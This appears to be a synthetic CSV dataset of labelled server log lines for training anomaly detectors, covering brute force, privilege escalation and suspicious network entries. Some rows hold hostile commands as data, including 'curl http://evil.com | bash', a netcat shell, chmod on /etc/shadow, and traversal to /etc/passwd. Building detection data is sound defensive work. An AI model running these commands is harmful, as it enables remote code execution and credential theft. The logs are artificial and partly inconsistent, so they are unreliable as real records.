timestamp,log_message,label,anomaly_type
2026-01-03 22:02:05,Accepted password for nginx from 192.168.183.156 port 1948 ssh2,0,normal
2026-01-03 22:02:06,Received disconnect from 192.168.121.194 port 7826:11: disconnected by user,0,normal
2026-01-03 22:02:10,kernel: [530.622189] docker0: link down,0,normal
2026-01-03 22:02:14,Received disconnect from 192.168.91.49 port 19532:11: disconnected by user,0,normal
2026-01-03 22:02:21,"192.168.168.147 - - [04/Jan/2026:13:11:40 +0700] ""GET /index.html HTTP/1.1"" 200 16270",0,normal
2026-01-03 22:02:46,kernel: [989.878519] br-0: link up,0,normal
2026-01-03 22:02:52,kernel: [593.660270] eth1: link down,0,normal
2026-01-03 22:03:27,"192.168.185.222 - - [03/Jan/2026:22:19:14 +0700] ""POST /dashboard HTTP/1.1"" 200 9719",0,normal
2026-01-03 22:03:31,[DEBUG] Processing request from 192.168.218.245,0,normal
2026-01-03 22:03:32,Accepted password for apache from 192.168.65.99 port 37932 ssh2,0,normal
2026-01-03 22:03:41,[INFO] Application started successfully,0,normal
2026-01-03 22:03:45,[DEBUG] Processing request from 192.168.22.187,0,normal
2026-01-03 22:03:48,session opened for user root by (uid=0),0,normal
2026-01-03 22:03:57,sudo: root : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=curl http://evil.com | bash,1,privilege_escalation
2026-01-03 22:04:19,su: FAILED SU (to root) apache on pts/0,1,privilege_escalation
2026-01-03 22:04:36,Failed password for apache from 104.248.156.42 port 53806 ssh2,1,brute_force
2026-01-03 22:04:41,[INFO] User mysql logged in successfully,0,normal
2026-01-03 22:04:41,error: maximum authentication attempts exceeded for www-data from 185.220.193.202,1,brute_force
2026-01-03 22:04:45,[INFO] Request processed in 529ms,0,normal
2026-01-03 22:04:54,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:04:55,"192.168.179.223 - - [04/Jan/2026:13:47:44 +0700] ""POST / HTTP/1.1"" 200 1236",0,normal
2026-01-03 22:05:00,[INFO] Application started successfully,0,normal
2026-01-03 22:05:04,sudo: www-data : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=chmod 777 /etc/shadow,1,privilege_escalation
2026-01-03 22:05:12,[INFO] User user logged in successfully,0,normal
2026-01-03 22:05:26,[DEBUG] Processing request from 192.168.204.125,0,normal
2026-01-03 22:05:29,"192.168.248.195 - - [04/Jan/2026:05:23:03 +0700] ""GET /api/v1/data HTTP/1.1"" 200 28425",0,normal
2026-01-03 22:05:35,[INFO] Cache hit for key: cache_key_744,0,normal
2026-01-03 22:05:49,[DEBUG] Processing request from 192.168.201.179,0,normal
2026-01-03 22:06:17,[DEBUG] Processing request from 192.168.188.204,0,normal
2026-01-03 22:06:20,[INFO] Request processed in 2182ms,0,normal
2026-01-03 22:06:28,"192.168.133.66 - - [04/Jan/2026:00:49:27 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-03 22:06:37,"192.168.155.19 - - [04/Jan/2026:02:11:38 +0700] ""GET / HTTP/1.1"" 200 43172",0,normal
2026-01-03 22:06:41,kernel: [794.436214] wlan0: link down,0,normal
2026-01-03 22:06:47,Received disconnect from 192.168.231.172 port 24505:11: disconnected by user,0,normal
2026-01-03 22:07:26,"192.168.70.192 - - [04/Jan/2026:02:51:57 +0700] ""POST /images/logo.png HTTP/1.1"" 200 36228",0,normal
2026-01-03 22:07:30,[INFO] Request processed in 1113ms,0,normal
2026-01-03 22:07:33,[INFO] Application started successfully,0,normal
2026-01-03 22:07:40,Failed password for admin from 185.220.72.188 port 15738 ssh2,1,brute_force
2026-01-03 22:07:47,[DEBUG] Processing request from 192.168.234.237,0,normal
2026-01-03 22:07:51,Connection received: host=192.168.26.12 user=user database=analytics,0,normal
2026-01-03 22:07:52,"192.168.140.124 - - [04/Jan/2026:01:28:15 +0700] ""POST /index.html HTTP/1.1"" 200 37536",0,normal
2026-01-03 22:07:54,"192.168.248.176 - - [04/Jan/2026:13:03:38 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-03 22:08:05,"192.168.38.214 - - [04/Jan/2026:11:50:13 +0700] ""POST /admin HTTP/1.1"" 200 2542",0,normal
2026-01-03 22:08:14,Possible SQL injection attack from 192.42.42.250: <script>alert('xss')</script>,1,suspicious_network
2026-01-03 22:08:29,MySQL server started with process id 49904,0,normal
2026-01-03 22:08:35,[INFO] Application started successfully,0,normal
2026-01-03 22:08:56,[INFO] Application started successfully,0,normal
2026-01-03 22:09:00,session closed for user nginx,0,normal
2026-01-03 22:09:08,Connection received: host=192.168.218.159 user=guest database=staging,0,normal
2026-01-03 22:09:37,Connection received: host=192.168.242.95 user=nginx database=users,0,normal
2026-01-03 22:09:41,Blocked suspicious request from 192.42.92.54: /api/v1/users,1,suspicious_network
2026-01-03 22:10:06,[DEBUG] Processing request from 192.168.90.212,0,normal
2026-01-03 22:10:22,[INFO] Cache hit for key: cache_key_780,0,normal
2026-01-03 22:10:25,sudo: guest : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/bin/nc -e /bin/bash,1,privilege_escalation
2026-01-03 22:10:25,[INFO] Application started successfully,0,normal
2026-01-03 22:10:40,[DEBUG] Processing request from 192.168.21.216,0,normal
2026-01-03 22:10:42,kernel: [466.756057] eth1: link up,0,normal
2026-01-03 22:10:43,MySQL server started with process id 7791,0,normal
2026-01-03 22:10:59,"104.248.99.101 - - [04/Jan/2026:07:05:06 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 13950",1,suspicious_network
2026-01-03 22:11:02,session closed for user postgres,0,normal
2026-01-03 22:11:06,systemd[1]: Stopped redis.service,0,normal
2026-01-03 22:11:10,Connection received: host=192.168.64.179 user=user database=test,0,normal
2026-01-03 22:11:27,kernel: [796.184605] docker0: link down,0,normal
2026-01-03 22:11:29,"192.168.30.113 - - [04/Jan/2026:02:49:05 +0700] ""POST /admin HTTP/1.1"" 200 36066",0,normal
2026-01-03 22:12:04,"192.168.22.180 - - [03/Jan/2026:22:26:30 +0700] ""POST /api/v1/users HTTP/1.1"" 200 38213",0,normal
2026-01-03 22:12:11,[INFO] User guest logged in successfully,0,normal
2026-01-03 22:12:24,"192.168.248.110 - - [04/Jan/2026:00:18:46 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 48546",0,normal
2026-01-03 22:12:27,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 22:12:33,kernel: [458.798572] eth1: link up,0,normal
2026-01-03 22:12:36,Connection received: host=192.168.218.37 user=apache database=analytics,0,normal
2026-01-03 22:13:02,[DEBUG] Processing request from 192.168.28.109,0,normal
2026-01-03 22:13:07,[INFO] Request processed in 1300ms,0,normal
2026-01-03 22:13:13,Connection received: host=192.168.86.125 user=apache database=production,0,normal
2026-01-03 22:13:30,DDoS attack detected from 185.220.50.126 - rate limit exceeded,1,suspicious_network
2026-01-03 22:13:30,"192.168.218.186 - - [04/Jan/2026:06:19:23 +0700] ""POST /css/style.css HTTP/1.1"" 200 41644",0,normal
2026-01-03 22:13:38,[INFO] Cache hit for key: cache_key_98,0,normal
2026-01-03 22:13:42,"192.168.222.193 - - [04/Jan/2026:07:31:18 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-03 22:13:44,systemd[1]: Started cron.service,0,normal
2026-01-03 22:13:50,systemd[1]: Started docker.service,0,normal
2026-01-03 22:14:13,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:14:14,Blocked suspicious request from 104.248.169.144: /css/style.css,1,suspicious_network
2026-01-03 22:14:21,session closed for user guest,0,normal
2026-01-03 22:14:26,systemd[1]: Stopped nginx.service,0,normal
2026-01-03 22:14:32,[INFO] Cache hit for key: cache_key_8,0,normal
2026-01-03 22:15:01,Connection received: host=192.168.31.114 user=root database=staging,0,normal
2026-01-03 22:15:02,systemd[1]: Starting mysql.service...,0,normal
2026-01-03 22:15:06,"192.168.162.22 - - [04/Jan/2026:10:36:18 +0700] ""POST /api/v1/data HTTP/1.1"" 200 46779",0,normal
2026-01-03 22:15:13,"192.168.64.71 - - [04/Jan/2026:12:54:38 +0700] ""POST /login HTTP/1.1"" 200 39487",0,normal
2026-01-03 22:15:34,[DEBUG] Processing request from 192.168.179.57,0,normal
2026-01-03 22:15:58,"192.42.243.28 - - [03/Jan/2026:17:53:50 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 4501",1,suspicious_network
2026-01-03 22:15:59,[INFO] Application started successfully,0,normal
2026-01-03 22:16:02,[DEBUG] Processing request from 192.168.31.191,0,normal
2026-01-03 22:16:25,[INFO] Request processed in 1359ms,0,normal
2026-01-03 22:16:45,session opened for user user by (uid=0),0,normal
2026-01-03 22:17:06,[INFO] User nginx logged in successfully,0,normal
2026-01-03 22:17:29,"192.168.161.71 - - [03/Jan/2026:23:52:44 +0700] ""GET / HTTP/1.1"" 200 47291",0,normal
2026-01-03 22:17:32,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.248.160.88,1,brute_force
2026-01-03 22:17:38,Accepted password for postgres from 192.168.2.116 port 54719 ssh2,0,normal
2026-01-03 22:17:49,"192.168.138.229 - - [04/Jan/2026:02:39:33 +0700] ""POST /dashboard HTTP/1.1"" 200 45945",0,normal
2026-01-03 22:18:10,systemd[1]: Started redis.service,0,normal
2026-01-03 22:18:19,"192.168.150.119 - - [03/Jan/2026:15:22:17 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-03 22:18:19,MySQL server started with process id 32971,0,normal
2026-01-03 22:18:19,WARNING: Cryptominer activity detected on process 63764,1,malware_indicator
2026-01-03 22:18:23,systemd[1]: Started docker.service,0,normal
2026-01-03 22:18:26,[INFO] Application started successfully,0,normal
2026-01-03 22:18:33,[INFO] User root logged in successfully,0,normal
2026-01-03 22:18:43,session opened for user nginx by (uid=0),0,normal
2026-01-03 22:18:57,systemd[1]: Starting redis.service...,0,normal
2026-01-03 22:18:58,[INFO] Request processed in 2529ms,0,normal
2026-01-03 22:19:05,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:19:32,"192.168.40.1 - - [03/Jan/2026:14:33:24 +0700] ""POST /login HTTP/1.1"" 200 3545",0,normal
2026-01-03 22:19:46,Blocked suspicious request from 45.33.174.162: /dashboard,1,suspicious_network
2026-01-03 22:19:57,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 22:20:07,session opened for user postgres by (uid=0),0,normal
2026-01-03 22:20:10,session opened for user apache by (uid=0),0,normal
2026-01-03 22:20:12,systemd[1]: Starting redis.service...,0,normal
2026-01-03 22:20:14,systemd[1]: Stopped apache2.service,0,normal
2026-01-03 22:20:14,session closed for user guest,0,normal
2026-01-03 22:20:15,[INFO] Request processed in 662ms,0,normal
2026-01-03 22:20:17,[INFO] Application started successfully,0,normal
2026-01-03 22:20:19,kernel: Out of memory: Kill process 46637 (ransomware) score 629,1,system_error
2026-01-03 22:20:39,kernel: Out of memory: Kill process 16773 (botnet_client) score 545,1,system_error
2026-01-03 22:20:49,session closed for user apache,0,normal
2026-01-03 22:20:58,session opened for user www-data by (uid=0),0,normal
2026-01-03 22:21:15,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:21:22,[INFO] Application started successfully,0,normal
2026-01-03 22:21:50,session closed for user www-data,0,normal
2026-01-03 22:22:00,[INFO] Cache hit for key: cache_key_317,0,normal
2026-01-03 22:22:02,systemd[1]: Stopped redis.service,0,normal
2026-01-03 22:22:27,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:22:29,[INFO] Application started successfully,0,normal
2026-01-03 22:22:33,Failed password for invalid user user from 45.33.58.209 port 34742 ssh2,1,brute_force
2026-01-03 22:22:33,"192.168.33.134 - - [04/Jan/2026:09:02:13 +0700] ""POST /api/v1/users HTTP/1.1"" 200 29411",0,normal
2026-01-03 22:22:35,systemd[1]: Started ssh.service,0,normal
2026-01-03 22:22:38,session opened for user user by (uid=0),0,normal
2026-01-03 22:22:48,"192.168.111.200 - - [04/Jan/2026:10:08:45 +0700] ""GET /css/style.css HTTP/1.1"" 200 27480",0,normal
2026-01-03 22:22:57,[INFO] User nginx logged in successfully,0,normal
2026-01-03 22:23:16,[INFO] Request processed in 102ms,0,normal
2026-01-03 22:23:18,MySQL server started with process id 36574,0,normal
2026-01-03 22:23:28,session opened for user admin by (uid=0),0,normal
2026-01-03 22:23:30,[INFO] Cache hit for key: cache_key_830,0,normal
2026-01-03 22:23:39,systemd[1]: Started redis.service,0,normal
2026-01-03 22:23:59,Received disconnect from 192.168.71.122 port 58962:11: disconnected by user,0,normal
2026-01-03 22:24:15,kernel: [326.924359] docker0: link down,0,normal
2026-01-03 22:24:16,DDoS attack detected from 45.33.9.90 - rate limit exceeded,1,suspicious_network
2026-01-03 22:24:28,systemd[1]: Started redis.service,0,normal
2026-01-03 22:24:28,[INFO] Request processed in 3085ms,0,normal
2026-01-03 22:24:29,kernel: [821.587213] docker0: link up,0,normal
2026-01-03 22:24:33,Received disconnect from 192.168.182.202 port 9991:11: disconnected by user,0,normal
2026-01-03 22:24:33,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:24:37,ALERT: Unauthorized privilege escalation attempt by postgres,1,privilege_escalation
2026-01-03 22:24:37,Received disconnect from 192.168.223.208 port 44578:11: disconnected by user,0,normal
2026-01-03 22:24:38,Accepted password for postgres from 192.168.224.207 port 46342 ssh2,0,normal
2026-01-03 22:24:41,Connection received: host=192.168.120.58 user=user database=production,0,normal
2026-01-03 22:24:41,[INFO] Request processed in 377ms,0,normal
2026-01-03 22:25:24,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:25:25,Accepted password for guest from 192.168.213.253 port 23855 ssh2,0,normal
2026-01-03 22:25:28,systemd[1]: Started nginx.service,0,normal
2026-01-03 22:25:28,session closed for user nginx,0,normal
2026-01-03 22:25:29,systemd[1]: Starting ssh.service...,0,normal
2026-01-03 22:25:38,session closed for user postgres,0,normal
2026-01-03 22:25:40,session opened for user nginx by (uid=0),0,normal
2026-01-03 22:25:44,systemd[1]: Started apache2.service,0,normal
2026-01-03 22:25:53,[INFO] Application started successfully,0,normal
2026-01-03 22:25:55,kernel: [680.978389] br-0: link up,0,normal
2026-01-03 22:26:10,Accepted password for www-data from 192.168.67.116 port 48885 ssh2,0,normal
2026-01-03 22:26:13,Failed password for invalid user mysql from 192.42.159.142 port 65409 ssh2,1,brute_force
2026-01-03 22:26:22,[ERROR] Memory allocation failed for request from 45.33.231.222,1,system_error
2026-01-03 22:26:58,"192.168.172.253 - - [04/Jan/2026:06:33:28 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-03 22:27:00,session opened for user root by (uid=0),0,normal
2026-01-03 22:27:02,Connection received: host=192.168.115.183 user=user database=staging,0,normal
2026-01-03 22:27:04,kernel: [680.268819] br-0: link up,0,normal
2026-01-03 22:27:12,[INFO] Application started successfully,0,normal
2026-01-03 22:27:29,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:27:49,session closed for user mysql,0,normal
2026-01-03 22:27:57,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:28:02,[INFO] Application started successfully,0,normal
2026-01-03 22:28:07,[INFO] Request processed in 300ms,0,normal
2026-01-03 22:28:15,"192.168.15.54 - - [03/Jan/2026:19:06:22 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-03 22:28:21,session closed for user www-data,0,normal
2026-01-03 22:28:24,Received disconnect from 192.168.113.149 port 39402:11: disconnected by user,0,normal
2026-01-03 22:28:27,[INFO] User admin logged in successfully,0,normal
2026-01-03 22:28:33,"192.168.200.133 - - [04/Jan/2026:09:12:26 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-03 22:28:58,[INFO] User user logged in successfully,0,normal
2026-01-03 22:29:01,[INFO] Application started successfully,0,normal
2026-01-03 22:29:01,[INFO] Application started successfully,0,normal
2026-01-03 22:29:03,"192.168.188.243 - - [03/Jan/2026:17:04:24 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-03 22:29:14,[ERROR] Memory allocation failed for request from 192.42.137.94,1,system_error
2026-01-03 22:29:28,Accepted password for mysql from 192.168.215.44 port 27151 ssh2,0,normal
2026-01-03 22:29:30,[DEBUG] Processing request from 192.168.7.74,0,normal
2026-01-03 22:29:33,Accepted password for www-data from 192.168.23.207 port 53970 ssh2,0,normal
2026-01-03 22:29:45,"192.168.45.14 - - [04/Jan/2026:03:46:33 +0700] ""POST /api/v1/users HTTP/1.1"" 200 12759",0,normal
2026-01-03 22:29:51,Received disconnect from 192.168.205.135 port 42726:11: disconnected by user,0,normal
2026-01-03 22:29:55,session closed for user www-data,0,normal
2026-01-03 22:30:01,systemd[1]: Started cron.service,0,normal
2026-01-03 22:30:02,[DEBUG] Processing request from 192.168.207.217,0,normal
2026-01-03 22:30:07,MySQL server started with process id 37956,0,normal
2026-01-03 22:30:09,Blocked suspicious request from 45.33.219.56: /api/v1/data,1,suspicious_network
2026-01-03 22:30:20,Received disconnect from 192.168.190.11 port 53204:11: disconnected by user,0,normal
2026-01-03 22:30:21,systemd[1]: Starting postgresql.service...,0,normal
2026-01-03 22:30:21,Received disconnect from 192.168.158.42 port 32436:11: disconnected by user,0,normal
2026-01-03 22:30:22,"192.168.245.239 - - [04/Jan/2026:09:01:53 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-03 22:30:24,[INFO] Application started successfully,0,normal
2026-01-03 22:30:28,[INFO] Application started successfully,0,normal
2026-01-03 22:30:30,Accepted password for apache from 192.168.28.7 port 25984 ssh2,0,normal
2026-01-03 22:30:31,"192.168.99.181 - - [04/Jan/2026:13:43:39 +0700] ""GET /admin HTTP/1.1"" 200 2475",0,normal
